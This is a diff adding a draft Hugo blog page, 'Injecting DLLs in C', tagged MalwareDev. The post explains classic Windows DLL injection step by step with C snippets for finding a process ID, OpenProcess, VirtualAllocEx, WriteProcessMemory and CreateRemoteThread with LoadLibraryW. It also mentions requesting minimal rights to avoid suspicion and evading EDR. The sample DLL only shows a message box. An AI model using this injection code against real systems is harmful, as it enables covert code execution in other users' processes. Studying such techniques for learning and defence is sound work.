@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Injecting DLLs in C | Blog.Yahya</title>
+<meta name="keywords" content="C, DLL, MalwareDev, Windows">
+<meta name="description" content="Hey folks, its been a while since i last posted anything on the blog but i am holding myself accountable and gonna be posting again regularly ;) enough of that and let&rsquo;s talk about some DLL injection! I will explain as much as possible without going onto a lot of tangents so further reading is always encouraged. Of course this is for educational purposes only blah blah.
+DLL Injection??? DLL injection is a &ldquo;sneaky&rdquo; way to insert our code in the address space of the target process thereby executing our code!">
+<meta name="author" content="Yahya Korayem">
+<link rel="canonical" href="//localhost:1313/posts/dllinjection/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.5cfc680b1eeaeef9efbced92d46c2a9e876b72ee14fba85846afc4cff9e6e6f8.css" integrity="sha256-XPxoCx7q7vnvvO2S1Gwqnodrcu4U&#43;6hYRq/Ez/nm5vg=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="//localhost:1313/favicons/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="//localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="//localhost:1313/posts/dllinjection/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="//localhost:1313/" accesskey="h" title="Blog.Yahya (Alt + H)">Blog.Yahya</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="//localhost:1313/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="//localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="//localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title">
+      Injecting DLLs in C<sup><span class="entry-isdraft">&nbsp;&nbsp;[draft]</span></sup>
+    </h1>
+    <div class="post-meta"><span title='2024-03-14 22:00:46 +0200 EET'>Thu, Mar 14, 2024</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Yahya Korayem
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#dll-injection" aria-label="DLL Injection???">DLL Injection???</a></li>
+                <li>
+                    <a href="#dont-you-mean-dll-hijacking" aria-label="Don&amp;rsquo;t You Mean DLL Hijacking?">Don&rsquo;t You Mean DLL Hijacking?</a></li>
+                <li>
+                    <a href="#how-does-it-work" aria-label="How Does it Work?">How Does it Work?</a></li>
+                <li>
+                    <a href="#whats-inside-a-dll" aria-label="What&amp;rsquo;s inside a DLL?">What&rsquo;s inside a DLL?</a></li>
+                <li>
+                    <a href="#things-to-consider" aria-label="Things to Consider">Things to Consider</a><ul>
+                        
+                <li>
+                    <a href="#error-checking-habits" aria-label="Error Checking habits">Error Checking habits</a></li>
+                <li>
+                    <a href="#process-architecture" aria-label="Process Architecture">Process Architecture</a></li></ul>
+                </li>
+                <li>
+                    <a href="#goodbye" aria-label="Goodbye">Goodbye</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>Hey folks, its been a while since i last posted anything on the blog but i am holding myself accountable and gonna be posting again regularly ;)
+enough of that and let&rsquo;s talk about some DLL injection!
+I will explain as much as possible without going onto a lot of tangents so further reading is always encouraged.
+Of course <em>this is for educational purposes only</em> blah blah.</p>
+<h2 id="dll-injection">DLL Injection???<a hidden class="anchor" aria-hidden="true" href="#dll-injection">#</a></h2>
+<p><img loading="lazy" src="hackerman.webp#center" alt="hackerman"  />
+</p>
+<p>DLL injection is a &ldquo;sneaky&rdquo; way to insert our code in the address space of the target process thereby executing our code! So when our malicious code executes it is not our process that is causing the harm and of course it&rsquo;s notepad! Yet it is not as fool proof -hence &ldquo;sneaky&rdquo;- as an EDR can detect the injection attempt with the sequence Win32 API calls.</p>
+<blockquote>
+<p>Of course evading an EDR is not impossible (e.g. API Hooking).</p>
+</blockquote>
+<h2 id="dont-you-mean-dll-hijacking">Don&rsquo;t You Mean DLL Hijacking?<a hidden class="anchor" aria-hidden="true" href="#dont-you-mean-dll-hijacking">#</a></h2>
+<p>While both techniques have the same end-goal in mind (Running our DLL in another process) each of them take a different path to get there. DLL hijacking abuses the <a href="https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">Dynamic-link library search order</a> when the a legitimate binary searches for the legitimate DLL to load it will find the malicious DLL first thereby executing the malicious code and this technique is very common in phishing attacks.</p>
+<h2 id="how-does-it-work">How Does it Work?<a hidden class="anchor" aria-hidden="true" href="#how-does-it-work">#</a></h2>
+<p>I created a humble diagram below sums the steps you would take to to pull off a DLL injection but before we further apply the steps in the diagram there is a perquisite we need to know which is the PID of the target process, the way i would go for this is to use <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot</a>, <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first">Process32First</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next">Process32Next</a> to get a list of the running processes iterate through them till you get the process find the name of the process you&rsquo;re looking for that would be something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>	PROCESSENTRY32 currentProcess;
+</span></span><span style="display:flex;"><span>	HANDLE Hsnapshot <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (Hsnapshot <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;couldn&#39;t take snapshot</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	currentProcess.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">Process32First</span>(Hsnapshot, <span style="color:#f92672">&amp;</span>currentProcess)) { 
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;couldn&#39;t access first process!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CloseHandle</span>(Hsnapshot);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">Process32Next</span>(Hsnapshot, <span style="color:#f92672">&amp;</span>currentProcess) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">wcscmp</span>(<span style="color:#f92672">&amp;</span>currentProcess.szExeFile, targetBin)) {
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">_tprintf</span>(<span style="color:#a6e22e">TEXT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">FOUND THE PROCESS:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s&#34;</span>), currentProcess.szExeFile);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">_tprintf</span>(<span style="color:#a6e22e">TEXT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Process ID:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">0x%08X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>), currentProcess.th32ProcessID);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> targetPID <span style="color:#f92672">=</span> currentProcess.th32ProcessID;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (targetPID <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;couldn&#39;t get PID&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CloseHandle</span>(Hsnapshot);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> targetPID;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">CloseHandle</span>(Hsnapshot);
+</span></span><span style="display:flex;"><span>} 
+</span></span></code></pre></div><p>So what this basically does is take a snapshot of running processes then we would iterate through them till we hit our targetBin , which is a defined process i declared above and i print it as a sanity check
+<strong>OR</strong> when the Process32Next() returns <code>FALSE</code> which means it failed to get the next process and for simplify we will assume that it means that he hit the end of our process list which would mean that it failed to get the next process.</p>
+<blockquote>
+<p>Note that the <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32?source=recommendations">PROCESSENTRY32</a> is a structure for  defining a process&rsquo;s information when we the snapshot was taken as you might guess we kinda need that.</p>
+</blockquote>
+<p><img loading="lazy" src="DLLInjection75.webp#center" alt="Diagram"  />
+</p>
+<p>Looking at our diagram the first step is to call <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess()</a> with our newly acquired PID ;)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>HANDLE hTarget <span style="color:#f92672">=</span> <span style="color:#a6e22e">OpenProcess</span>(PROCESS_VM_WRITE <span style="color:#f92672">|</span> PROCESS_VM_OPERATION <span style="color:#f92672">|</span> PROCESS_CREATE_THREAD, FALSE, dwPID);
+</span></span></code></pre></div><p>The first part is fairly straightforward with us calling <code>OpenProcess</code> allowing us to get handle to our target process that we can use to allocate memory and more in the next steps.
+it&rsquo;s worth to note that it&rsquo;s good practice to request as little permissions as you can as you would hopefully not raise much suspicion, so instead of calling <code>PROCESS_ALL_ACCESS</code> for the first parameter we can call:</p>
+<ul>
+<li><code>PROCESS_VM_WRITE</code> to allocate memory in the target process.</li>
+<li><code>PROCESS_VM_OPERATION</code> to actually use the allocated memory space.</li>
+<li><code>PROCESS_CREATE_THREAD</code> to eventual create our remote thread that will run our DLL.</li>
+</ul>
+<p>Rest of the permissions <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights">here</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>LPVOID buffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAllocEx</span>(HTarget, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(DLLPath), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</span></span></code></pre></div><p>Now in the second phase we want to allocate some space in the target&rsquo;s memory address space and we can achieve that by <code>VirtualAllocEx</code>, the EX stands for extended as the different between <code>VirtualAlloc</code> and <code>VirtualAllocEx</code> is that the second one is used for allocating space in another process which is EXACTLY what we are doing!</p>
+<blockquote>
+<p>Note that the space allocated by <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a> is initialized by zeros and the actually physical pages are not allocated until we actually access/use them as we passed <code>MEM_COMMIT</code> as the allocation type.</p>
+</blockquote>
+<p>Something i found confusing at first is the size of the memory allocation let&rsquo;s take a look at the example above and assume we have our path for the DLL something like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">wchar_t</span> DLLPath[] <span style="color:#f92672">=</span> <span style="color:#a6e22e">TEXT</span>(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">vog</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">source</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">repos</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Trial_DLL</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x64</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Debug</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Trial_DLL.dll&#34;</span>);
+</span></span></code></pre></div><p>So when specifying the size to allocate in bytes we are specifying the <strong>size of the DLL path</strong> not the actual size of the DLL file, meaning we are allocating enough space in the target process to store the path of our DLL in the target process&rsquo;s memory space. We are not loading the DLL file into the target process ourselves we are letting the target process do the dirty work for us as we are going to see in a bit.</p>
+<p>Finally the <code>VirutalAllocEx</code> returns the start address(pointer) of our newly acquired buffer in the target process!</p>
+<p><img loading="lazy" src="sizeof.png" alt="sizeof.png"  />
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#a6e22e">WriteProcessMemory</span>(HTarget, buffer, (LPVOID)DLLPath, <span style="color:#66d9ef">sizeof</span>(DLLPath), <span style="color:#ae81ff">0</span>)
+</span></span></code></pre></div><p>Next we just write the the data into the buffer we just allocated.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>LPTHREAD_START_ROUTINEthreatStartRoutineAddress <span style="color:#f92672">=</span> (LPTHREAD_START_ROUTINE)<span style="color:#a6e22e">GetProcAddress</span>(<span style="color:#a6e22e">GetModuleHandle</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Kernel32.dll&#34;</span>), <span style="color:#e6db74">&#34;LoadLibraryW&#34;</span>)
+</span></span></code></pre></div><p>Now before creating our thread we need to define its behavior(routine)upon running, we are basically telling the thread that it should look run <code>LoadLibraryW</code> upon running by locating it&rsquo;s address in the Kernel32.dll.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#a6e22e">CreateRemoteThread</span>(HTarget, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, threatStartRoutineAddress, buffer, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+</span></span></code></pre></div><p>Lastly we&rsquo;re finally calling <code>CreateRemoteThread</code> to execute our DLL in the target process with our <code>LPTHREAD_START_ROUTINE</code> pointing to the LoadLibrary that will load the DLL from the path stored in the buffer.</p>
+<h2 id="whats-inside-a-dll">What&rsquo;s inside a DLL?<a hidden class="anchor" aria-hidden="true" href="#whats-inside-a-dll">#</a></h2>
+<p>Now, what happens when the target process finally calls the DLL? How will it know what to do with it? I mean it was definetly not expecting our DLL in the first place.</p>
+<p>Now comes DLLMain.
+DLLs have useful function that serves similiar purose like the main we find in C/++/#, let&rsquo;s take a look:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">// dllmain.c : Defines the entry point for the DLL application.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>(HMODULE hModule,
+</span></span><span style="display:flex;"><span>	DWORD  ul_reason_for_call,
+</span></span><span style="display:flex;"><span>	LPVOID lpReserved
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">switch</span> (ul_reason_for_call)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH:
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">MessageBoxW</span>(
+</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">0</span>,       <span style="color:#75715e">//[in, optional] HWND hWnd,//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;TEXT&#34;</span>, <span style="color:#75715e">//[in, optional] LPCTSTR lpText,//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;TITLE&#34;</span>, <span style="color:#75715e">//[in, optional] LPCTSTR lpCaption, //
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#ae81ff">1</span>        <span style="color:#75715e">//[in]UINT uType//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Now lets take a look at the switch cases and in particular <code>DLL_PROCESS_ATTACH</code> case will automatically execute when the DLL is loaded</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>	<span style="color:#66d9ef">switch</span> (ul_reason_for_call)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH:
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//code to execute when the DLL is loaded
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">break</span>;
+</span></span></code></pre></div><h2 id="things-to-consider">Things to Consider<a hidden class="anchor" aria-hidden="true" href="#things-to-consider">#</a></h2>
+<h3 id="error-checking-habits">Error Checking habits<a hidden class="anchor" aria-hidden="true" href="#error-checking-habits">#</a></h3>
+<p>Something that will save you a lot of time when things break -which they always will- is putting the time to code handling functions that checks the return value of the API calls. A very useful resource i found was <a href="https://learn.microsoft.com/en-us/windows/win32/debug/retrieving-the-last-error-code">Retrieving the Last-Error Code</a>
+And calling it after you error check.
+For Example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>	LPVOID buffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAllocEx</span>(HTarget, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(DLLPath), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (buffer <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">//CLOSE BUFFER
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">ErrorExit</span>(<span style="color:#a6e22e">TEXT</span>(<span style="color:#e6db74">&#34;VirtualAllocEx&#34;</span>));
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p>After calling the <code>VirtualAllocEX</code> it&rsquo;s wise to check if anything was actually allocated by checking if the buffer isn&rsquo;t equal to null and if it is then something definitely went wrong there.</p>
+<p>If you are not sure what the function should return just google it and the first result should be MSDN which covers almost everything pretty well.</p>
+<h3 id="process-architecture">Process Architecture<a hidden class="anchor" aria-hidden="true" href="#process-architecture">#</a></h3>
+<p>Depending on the process architecture and if it&rsquo;s a official microsoft process it maybe harder to inject the DLL.</p>
+<p>For example if our injector process is 32 bit and the target is 64 bit or vise versa the injection cannot work.</p>
+<h2 id="goodbye">Goodbye<a hidden class="anchor" aria-hidden="true" href="#goodbye">#</a></h2>
+<p>Thanks for tunning in! I hope you enjoyed the blog post and found it useful. Your thoughts and suggestions are super important to me, so if you have any feedback or suggestions Don&rsquo;t hesitate to reach out.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="//localhost:1313/c/">C</a></li>
+      <li><a href="//localhost:1313/dll/">DLL</a></li>
+      <li><a href="//localhost:1313/malwaredev/">MalwareDev</a></li>
+      <li><a href="//localhost:1313/windows/">Windows</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="//localhost:1313/">Blog.Yahya</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
